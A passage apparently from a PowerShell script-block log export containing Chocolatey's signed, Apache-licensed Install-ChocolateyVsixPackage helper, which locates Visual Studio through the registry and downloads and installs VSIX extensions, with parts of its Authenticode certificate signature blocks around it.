dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xsIOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0wNjExMTAwMDAwMDBa # Fw0yMTExMTAwMDAwMDBaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lD # ZXJ0IEFzc3VyZWQgSUQgQ0EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC # ggEBAOiCLZn5ysJClaWAc0Bw0p5WVFypxNJBBo/JM/xNRZFcgZ/tLJz4FlnfnrUk # FcKYubR3SdyJxArar8tea+2tsHEx6886QAxGTZPsi3o2CAOrDDT+GEmC/sfHMUiA # fB6iD5IOUMnGh+s2P9gww/+m9/uizW9zI/6sVgWQ8DIhFonGcIj5BZd9o8dD3QLo # Oz3tsUGj7T++25VIxO4es/K8DCuZ0MZdEkKB4YNugnM/JksUkK5ZZgrEjb7Szgau # rYRvSISbT0C58Uzyr5j79s5AXVz2qPEvr+yJIvJrGGWxwXOt1/HYzx4KdFxCuGh+ # t9V3CidWfA9ipD8yFGCV/QcEogkCAwEAAaOCA3owggN2MA4GA1UdDwEB/wQEAwIB # hjA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEF # BQcDBAYIKwYBBQUHAwgwggHSBgNVHSAEggHJMIIBxTCCAbQGCmCGSAGG/WwAAQQw # ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # /WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkqhkiG9w0BCQQxIgQgY21LEp9apuTMLqguzypSjDhrQ2TRe8edZGc6 # /Wjr8LIwDQYJKoZIhvcNAQEBBQAEggEAVqid4PiRvy3Rz95AXsqvb7v8clOSDutY # mBU2Njes3J1iOx+jQbU5SD02i04upCKFeaeNN9FfzidZa4Q88uoeirKsKi0UGrjr # BnUIzamzRNRO7w3LLz4ctku8eFoEsNtkclcXy6HW3cubvQ9UUmznObLjlWY42hvl # /vVvzRJYkQyC3LlO5ny2obm6e7ZjiCRSNpasr9SAfoudEhmU/O3nAtayW3KstSwX # 6YGEEdcYKiK9PuPYg4PgPP7tgQMNhN4hQkM4pwL2DvGPDO0Z9TKJpm/uaANdw7Fc # WlJL1zMlIuOtVrHtVX7emS1O+9k7eSaGPbo+SYHmjbUXGQXS/U0/SaGCAg8wggIL # BgkqhkiG9w0BCQYxggH8MIIB+AIBATB2MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV # BAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0EtMQIQAwGaAjr/WLFr1tXq5hfwZjAJ # BgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0B # CQUxDxcNMTkwMzE1MTc1NjU5WjAjBgkqhkiG9w0BCQQxFgQU40gRxQX/DFfRvsp9 # uY236RUSX6swDQYJKoZIhvcNAQEBBQAEggEAdNctgo5xpF4Yvn6HDB1eWkeD2J7v # Ac6OQH2uoibswWMoa5QyXi4xmc8g4WULeNS32RyBeFWIicGr7We77EffVS6wvC2n # jjxXHuq1Lid5gxE7GgKs54GONcDbWCK7sWJ00qmkP7qrWMp5IrQxpNwgCuMTNBeL # ijKPb9xC3QnbiY9DOFoc5dc6fvFNAj93MqWi1tZUG524Fk+anAAYmExlUxDUmMPW # y8H2MnE9UtQFNSClb8KRZY9gkcpuOrR3dZsCU9deoW4qt8Y9zZ6SnjibCfHbuslP # EJ42K0/lJvs/KZRRjhscT8dOo732rd96hqXJjR9x6YnHdEEODbRXSxSHyA== # SIG # End signature block","MessageNumber: 1 ¦ MessageTotal: 1 ¦ Path: C:\ProgramData\chocolatey\helpers\functions\Install-ChocolateyVsixPackage.ps1 ¦ ScriptBlockId: 46f0956d-6140-43fe-9c0a-f925a3dfc335 ¦ ScriptBlockText: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2015 - 2017 RealDimensions Software, LLC # Copyright © 2011 - 2015 RealDimensions Software, LLC & original authors/contributors from https://github.com/chocolatey/chocolatey # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. function Install-ChocolateyVsixPackage { <# .SYNOPSIS Downloads and installs a VSIX package for Visual Studio .DESCRIPTION VSIX packages are Extensions for the Visual Studio IDE. The Visual Studio Gallery at http://visualstudiogallery.msdn.microsoft.com/ is the public extension feed and hosts thousands of extensions. You can locate a VSIX Url by finding the download link of Visual Studio extensions on the Visual Studio Gallery. .NOTES Chocolatey works best when the packages contain the software it is managing and doesn't require downloads. However most software in the Windows world requires redistribution rights and when sharing packages publicly (like on the community feed), maintainers may not have those aforementioned rights. Chocolatey understands how to work with that, hence this function. You are not subject to this limitation with internal packages. .INPUTS None .OUTPUTS None .PARAMETER PackageName The name of the package - while this is an arbitrary value, it's recommended that it matches the package id. In 0.10.4+, `Name` is an alias for PackageName. .PARAMETER VsixUrl The URL of the package to be installed. Prefer HTTPS when available. Can be HTTP, FTP, or File URIs. In 0.10.4+, `Url` is an alias for VsixUrl. .PARAMETER VsVersion The major version number of Visual Studio where the package should be installed. This is optional. If not specified, the most recent Visual Studio installation will be targetted. NOTE: For Visual Studio 2015, the VsVersion is 14. It can be determined by looking at the folders under Program Files / Program Files (x86). In 0.10.4+, `VisualStudioVersion` is an alias for VsVersion. .PARAMETER Checksum The checksum hash value of the Url resource. This allows a checksum to be validated for files that are not local. The checksum type is covered by ChecksumType. **NOTE:** Checksums in packages are meant as a measure to validate the originally intended file that was used in the creation of a package is the same file that is received at a future date. Since this is used for other steps in the process related to the community repository, it ensures that the file a user receives is the same file a maintainer and a moderator (if applicable), plus any moderation review has intended for you to receive with this package. If you are looking at a remote source that uses the same url for updates, you will need to ensure the package also stays updated in line with those remote resource updates. You should look into [automatic packaging](https://chocolatey.org/docs/automatic-packages) to help provide that functionality. **NOTE:** To determine checksums, you can get that from the original site if provided. You can also use the [checksum tool available on the community feed](https://chocolatey.org/packages/checksum) (`choco install checksum`) and use it e.g. `checksum -t sha256 -f path\to\file`. Ensure you provide checksums for all remote resources used. .PARAMETER ChecksumType The type of checkum that the file is validated with - valid values are 'md5', 'sha1', 'sha256' or 'sha512' - defaults to 'md5'. MD5 is not recommended as certain organizations need to use FIPS compliant algorithms for hashing - see https://support.microsoft.com/en-us/kb/811833 for more details. The recommendation is to use at least SHA256. .PARAMETER Options OPTIONAL - Specify custom headers. Available in 0.9.10+. .PARAMETER File Will be used for VsixUrl if VsixUrl is empty. Available in 0.10.7+. This parameter provides compatibility, but should not be used directly and not with the community package repository until January 2018. .PARAMETER IgnoredArguments Allows splatting with arguments that do not apply. Do not use directly. .EXAMPLE > # This downloads the AutoWrockTestable VSIX from the Visual Studio # Gallery and installs it to the latest version of VS. Install-ChocolateyVsixPackage -PackageName ""MyPackage"" ` -VsixUrl http://visualstudiogallery.msdn.microsoft.com/ea3a37c9-1c76-4628-803e-b10a109e7943/file/73131/1/AutoWrockTestable.vsix .EXAMPLE > # This downloads the AutoWrockTestable VSIX from the Visual Studio # Gallery and installs it to Visual Studio 2012 (v11.0). Install-ChocolateyVsixPackage -PackageName ""MyPackage"" ` -VsixUrl http://visualstudiogallery.msdn.microsoft.com/ea3a37c9-1c76-4628-803e-b10a109e7943/file/73131/1/AutoWrockTestable.vsix ` -VsVersion 11 .LINK Install-ChocolateyPackage .LINK Install-ChocolateyInstallPackage .LINK Install-ChocolateyZipPackage #> param( [alias(""name"")][parameter(Mandatory=$true, Position=0)][string] $packageName, [alias(""url"")][parameter(Mandatory=$false, Position=1)][string] $vsixUrl, [alias(""visualStudioVersion"")][parameter(Mandatory=$false, Position=2)][int] $vsVersion = 0, [parameter(Mandatory=$false)][string] $checksum = '', [parameter(Mandatory=$false)][string] $checksumType = '', [parameter(Mandatory=$false)][hashtable] $options = @{Headers=@{}}, [alias(""fileFullPath"")][parameter(Mandatory=$false)][string] $file = '', [parameter(ValueFromRemainingArguments = $true)][Object[]] $ignoredArguments ) Write-FunctionCallLogMessage -Invocation $MyInvocation -Parameters $PSBoundParameters if ($vsixUrl -eq '' -or $vsixUrl -eq $null) { $vsixUrl = $file } if($vsVersion -eq 0) { if ([System.IntPtr]::Size -eq 4) { <# 32bits system case #> $versions=(get-ChildItem HKLM:SOFTWARE\Microsoft\VisualStudio -ErrorAction SilentlyContinue | ? { ($_.PSChildName -match ""^[0-9\.]+$"") } | ? {$_.property -contains ""InstallDir""} | sort {[int]($_.PSChildName)} -descending) } else { $versions=(get-ChildItem HKLM:SOFTWARE\Wow6432Node\Microsoft\VisualStudio -ErrorAction SilentlyContinue | ? { ($_.PSChildName -match ""^[0-9\.]+$"") } | ? {$_.property -contains ""InstallDir""} | sort {[int]($_.PSChildName)} -descending) } if($versions -and $versions.Length){ $version = $versions[0] }elseif($versions){ $version = $versions } } else { if ([System.IntPtr]::Size -eq 4) { <# 32bits system case #> $versions=(get-ChildItem HKLM:SOFTWARE\Microsoft\VisualStudio -ErrorAction SilentlyContinue | ? { ($_.PSChildName.EndsWith(""$vsVersion.0"")) } | ? {$_.property -contains ""InstallDir""}) } else { $version=(get-ChildItem HKLM:SOFTWARE\Wow6432Node\Microsoft\VisualStudio -ErrorAction SilentlyContinue | ? { ($_.PSChildName.EndsWith(""$vsVersion.0"")) } | ? {$_.property -contains ""InstallDir""}) } } if ($version) { $vnum=$version.PSPath.Substring($version.PSPath.LastIndexOf('\')+1) if($vnum -as [int] -lt 10) { throw ""This installed VS version, $vnum, does not support installing VSIX packages. Version 10 is the minimum acceptable version."" } $dir=(get-itemProperty $version.PSPath ""InstallDir"").InstallDir $installer = Join-Path $dir ""VsixInstaller.exe"" } if ($installer) { $download=""$env:TEMP\$($packageName.Replace(' ','')).vsix"" try{ Get-ChocolateyWebFile $packageName $download $vsixUrl -checksum $checksum -checksumType $checksumType -Options $options } catch { throw ""There were errors attempting to retrieve the vsix from $vsixUrl. The error message was '$_'."" } Write-Debug ""Installing VSIX using $installer"" $exitCode = Install-Vsix ""$installer"" ""$download"" if($exitCode -gt 0 -and $exitCode -ne 1001) { #1001: Already installed throw ""There was an error installing '$packageName'. The exit code returned was $exitCode."" } } else { throw ""Visual Studio is not installed or the specified version is not present."" } } # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCAwvbwbcXwGHARv # s0aL6zHGEwZUxYCbjjh5ZcXDMGFCc6CCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # 